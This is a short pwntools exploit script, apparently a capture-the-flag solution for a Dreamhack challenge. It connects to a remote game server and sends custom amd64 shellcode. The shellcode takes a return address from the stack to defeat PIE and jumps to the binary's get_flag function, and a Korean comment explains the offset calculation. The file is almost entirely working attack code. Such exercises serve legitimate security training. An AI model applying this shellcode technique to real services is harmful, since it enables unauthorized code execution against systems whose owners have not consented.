from pwn import *

# p = process('./main')
p = remote('host8.dreamhack.games', 14023)
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
e = ELF('./main')

# mov 자체는 괜찮음, 그리고 쉘코드가 실행될 때 rsp에 바로 main 어딘가가 있기 때문에 걔 가져와서 오프셋 배면 pie_base 구하기 가능
# get_flag = 0x1465

sc = '''
mov rax, [rsp]
sub rax, 0x144a
lea rax, [rax+0x1440]
add rax, 0x20
add rax, 0x04
add rax, 0x01
push rax
ret
'''
print('get_flag: ', hex(e.sym['get_flag']))

# gdb.attach(p)
# pause()
p.sendline(asm(sc))


p.interactive()